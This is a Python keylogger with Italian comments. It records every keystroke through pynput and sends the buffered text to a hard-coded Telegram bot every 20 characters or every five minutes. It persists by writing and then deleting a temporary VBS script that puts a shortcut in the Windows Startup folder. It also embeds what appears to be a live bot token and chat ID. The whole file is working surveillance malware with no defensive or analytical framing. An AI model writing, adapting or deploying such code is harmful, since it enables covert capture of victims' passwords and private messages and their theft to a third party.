import os
from pynput import keyboard
import threading
import time

def crea_collegamento_avvio(nome_collegamento, percorso_script_pyw):
    # 1. Individua la cartella 'Esecuzione Automatica' (Startup)
    startup_folder = os.path.join(os.environ['APPDATA'], 
                                  r'Microsoft\Windows\Start Menu\Programs\Startup')
    
    # 2. Definisci il percorso dove dovrebbe essere il collegamento (.lnk)
    path_collegamento = os.path.join(startup_folder, f"{nome_collegamento}.lnk")
    
    # --- LOGICA DI CONTROLLO ---
    try:
        if os.path.exists(path_collegamento):
            return # Esci dalla funzione, non serve fare altro
        
        # 3. Script VBS temporaneo per creare il collegamento
        vbs_script = f'''
        Set oWS = WScript.CreateObject("WScript.Shell")
        sLinkFile = "{path_collegamento}"
        Set oLink = oWS.CreateShortcut(sLinkFile)
        oLink.TargetPath = "{percorso_script_pyw}"
        oLink.Save
        '''
        
        vbs_file = "temp_shortcut_maker.vbs"
        
        # Scrivi il file VBS
        with open(vbs_file, "w") as f:
            f.write(vbs_script)
            
        # Eseguilo e poi cancellalo
        os.system(f"cscript //nologo {vbs_file}")
        os.remove(vbs_file)
        
    except Exception as e:
        return

def invia_telegram(testo):
    """Funzione sincrona per inviare messaggi (usando requests per semplicità nel thread)"""
    import requests
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": testo}
    try:
        requests.post(url, json=payload)
    except Exception as e:
        return

def controlla_e_invia():
    """Funzione che unisce l'array, lo invia e lo svuota"""
    global buffer_tasti
    with lock:
        if buffer_tasti:
            messaggio = "".join(buffer_tasti)
            invia_telegram(messaggio)
            buffer_tasti.clear() # Svuota l'array dopo l'invio

def timer_background():
    """Thread che ogni 5 minuti controlla se c'è qualcosa da inviare"""
    while True:
        time.sleep(TIME_INTERVAL)
        controlla_e_invia()

def on_press(key):
    global buffer_tasti
    
    # Formattazione del tasto
    try:
        k = key.char # Lettere e numeri
    except AttributeError:
        k = f"[{key.name}]" # Tasti speciali (Space, Enter, ecc.)

    with lock:
        buffer_tasti.append(k)
        
        # Se raggiungiamo i 20 caratteri, invia subito
        if len(buffer_tasti) >= MAX_CHARS:
            # Eseguiamo l'invio in un thread separato per non bloccare la tastiera
            threading.Thread(target=controlla_e_invia).start()

# --- CONFIGURAZIONE ---
nome = "MioScriptAutomatico"
# Assicurati che 'script_principale.pyw' sia il nome corretto del file da avviare
percorso_pyw = os.path.join(os.getcwd(), "script_principale.pyw") 

crea_collegamento_avvio(nome, percorso_pyw)

# Configurazione
TOKEN = "8403069594:AAErhDK3zbrWATQpV9vyEb5uKQpYjIv2-M0"
CHAT_ID = "6151801521"
MAX_CHARS = 20
TIME_INTERVAL = 300  # 5 minuti in secondi

# Variabili di stato
buffer_tasti = []
lock = threading.Lock() # Per evitare conflitti tra i thread quando leggiamo/svuotiamo l'array

if __name__ == '__main__':
    
    # Avvia il thread per il controllo temporale (5 min)
    t = threading.Thread(target=timer_background, daemon=True)
    t.start()

    # Avvia il listener della tastiera
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
